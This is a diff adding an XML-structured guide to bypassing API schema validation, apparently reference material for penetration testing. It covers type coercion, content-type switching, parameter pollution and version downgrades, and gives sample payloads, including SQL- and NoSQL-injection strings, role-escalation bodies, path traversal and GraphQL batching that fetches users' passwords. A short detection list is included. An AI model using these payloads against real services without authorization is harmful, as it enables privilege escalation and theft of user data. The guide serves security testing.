@@ -1,0 +1,265 @@
+<vulnerability_guide>
+  <title>API SCHEMA BYPASS</title>
+
+  <critical>API schemas (OpenAPI, JSON Schema, GraphQL) define expected inputs, but validation enforcement varies. Bypassing schema validation allows injection of unexpected data types, extra parameters, and malformed inputs that the business logic may still process, leading to authorization bypass, data corruption, or code execution.</critical>
+
+  <scope>
+    - OpenAPI/Swagger validation bypass
+    - JSON Schema constraint bypass
+    - GraphQL type coercion
+    - Content-type manipulation
+    - Schema-business logic gaps
+    - Versioning exploitation
+  </scope>
+
+  <methodology>
+    1. SCHEMA DISCOVERY
+       {% raw %}
+       # Find API schemas
+       /swagger.json
+       /swagger.yaml
+       /openapi.json
+       /openapi.yaml
+       /api-docs
+       /v1/api-docs
+       /graphql (introspection)
+       /.well-known/openapi
+
+       # Download and analyze
+       curl https://api.target.com/swagger.json | jq
+
+       # Check for:
+       # - Required vs optional fields
+       # - Type constraints
+       # - Enum values
+       # - Pattern validations
+       # - min/max constraints
+       {% endraw %}
+
+    2. TYPE COERCION ATTACKS
+       {% raw %}
+       # Schema expects integer, send string
+       # Expected: {"id": 123}
+       # Try: {"id": "123"} or {"id": "123abc"}
+
+       # Boolean coercion
+       # Expected: {"admin": false}
+       # Try: {"admin": "true"} or {"admin": 1}
+
+       # Array vs single value
+       # Expected: {"role": "user"}
+       # Try: {"role": ["user", "admin"]}
+
+       # Null injection
+       # Expected: {"email": "user@example.com"}
+       # Try: {"email": null}
+
+       # Object type confusion
+       # Expected: {"data": "string"}
+       # Try: {"data": {"$ne": ""}}  # NoSQL operator
+       {% endraw %}
+
+    3. CONTENT-TYPE MANIPULATION
+       {% raw %}
+       # Server may process multiple content types differently
+
+       # Standard JSON
+       Content-Type: application/json
+       {"username": "admin", "role": "admin"}
+
+       # URL-encoded (may bypass JSON schema)
+       Content-Type: application/x-www-form-urlencoded
+       username=admin&role=admin
+
+       # XML if supported (XXE potential)
+       Content-Type: application/xml
+       <user><username>admin</username><role>admin</role></user>
+
+       # Multipart form data
+       Content-Type: multipart/form-data
+       # May handle parameters differently
+
+       # No content-type
+       # Some frameworks have default handling
+       {% endraw %}
+
+    4. PARAMETER POLLUTION
+       {% raw %}
+       # Duplicate parameters
+       {"id": 1, "id": 999}  # Which one wins?
+
+       # Mixed sources
+       GET /api/users?role=user
+       Body: {"role": "admin"}
+       # Query vs body parameter precedence
+
+       # Array parameter injection
+       /api/users?id[]=1&id[]=2
+       /api/users?id=1&id=2
+
+       # Nested parameter override
+       {"user": {"role": "user"}, "user.role": "admin"}
+       {% endraw %}
+
+    5. CONSTRAINT BYPASS
+       {% raw %}
+       # Length constraints
+       # Schema: maxLength: 50
+       # Try: 51+ characters, may truncate dangerously
+
+       # Pattern bypass
+       # Schema: pattern: "^[a-z]+$"
+       # Try: unicode lookalikes, null bytes
+
+       # Enum bypass
+       # Schema: enum: ["user", "moderator"]
+       # Try: "ADMIN", "admin", "Admin", "  admin  "
+
+       # Number range
+       # Schema: minimum: 0, maximum: 100
+       # Try: -1, 101, 1e308, NaN, Infinity
+
+       # Required field bypass
+       # Send empty string: {"required_field": ""}
+       # Send whitespace: {"required_field": "   "}
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <graphql_type_bypass>
+      {% raw %}
+      # GraphQL type coercion
+
+      # ID vs String
+      query { user(id: "1 OR 1=1") { name } }
+
+      # Int overflow
+      query { user(id: 99999999999999999999) { name } }
+
+      # Custom scalar bypass
+      # DateTime: "2023-01-01T00:00:00Z' OR '1'='1"
+
+      # Input validation vs type validation
+      mutation {
+        updateUser(input: {
+          email: "not-an-email"  # Type says String, not Email
+        }) { id }
+      }
+
+      # Batching for bypass
+      [
+        {"query": "{ user(id: 1) { password } }"},
+        {"query": "{ user(id: 2) { password } }"}
+      ]
+      {% endraw %}
+    </graphql_type_bypass>
+
+    <additionalProperties_bypass>
+      {% raw %}
+      # JSON Schema additionalProperties
+
+      # If additionalProperties: false not enforced
+      {"name": "user", "extraField": "value"}
+
+      # Nested additionalProperties
+      {
+        "user": {
+          "name": "test",
+          "admin": true  # Not in schema but processed
+        }
+      }
+
+      # Check if backend uses schema for:
+      # 1. Input validation only
+      # 2. Data binding
+      # 3. Both (rare)
+      {% endraw %}
+    </additionalProperties_bypass>
+
+    <version_downgrade>
+      {% raw %}
+      # API versioning attacks
+
+      # Old version may have weaker validation
+      /v1/api/users  # Old, lenient
+      /v2/api/users  # New, strict
+
+      # Header-based version
+      X-API-Version: 1
+      Api-Version: 2020-01-01
+
+      # Accept header version
+      Accept: application/vnd.api+json; version=1
+
+      # Version in path bypass
+      /v2/../v1/api/users
+      /api/v2/../../v1/users
+      {% endraw %}
+    </version_downgrade>
+
+    <schema_caching_issues>
+      {% raw %}
+      # Cached vs live schema differences
+
+      # Gateway caches schema
+      # Backend updated, gateway still uses old
+      # Send request matching new (unseen) schema
+
+      # Schema refresh timing
+      # Send request during schema update
+      # May bypass validation entirely
+
+      # Multi-service schema drift
+      # Microservices have different schema versions
+      # Exploit inconsistencies
+      {% endraw %}
+    </schema_caching_issues>
+
+    <nullable_exploitation>
+      {% raw %}
+      # Null handling differences
+
+      # Explicit null
+      {"role": null}  # May bypass default assignment
+
+      # Undefined vs null
+      {}  # Missing field (undefined)
+      {"role": null}  # Explicit null
+
+      # Null in arrays
+      {"ids": [1, null, 2]}
+
+      # Nested null
+      {"user": {"role": null}}  # Clears role?
+      {"user": null}  # Clears entire user object?
+      {% endraw %}
+    </nullable_exploitation>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor for schema validation failures
+    - Log requests with unexpected content types
+    - Track type coercion occurrences
+    - Alert on parameter pollution attempts
+    - Check for version downgrade requests
+  </detection>
+
+  <validation>
+    - Successfully bypass type constraints
+    - Inject extra parameters past validation
+    - Exploit content-type differences
+    - Downgrade to vulnerable API version
+    - Document schema-logic gaps
+  </validation>
+
+  <pro_tips>
+    - Schema validation at gateway doesn't mean validation at service
+    - JSON Schema additionalProperties: false is rarely enforced
+    - Try both camelCase and snake_case for same parameter
+    - Empty strings, whitespace, and null are often handled differently
+    - Nested objects frequently bypass flat schema validation
+    - GraphQL type String accepts almost anything
+  </pro_tips>
+
+  <remember>API schemas describe intended behavior, but implementation may differ. Schema validation often happens at the API gateway while business logic runs in backend services - a request rejected by the gateway might succeed if you can reach the service directly. Always test actual enforcement, not documented constraints.</remember>
+</vulnerability_guide>
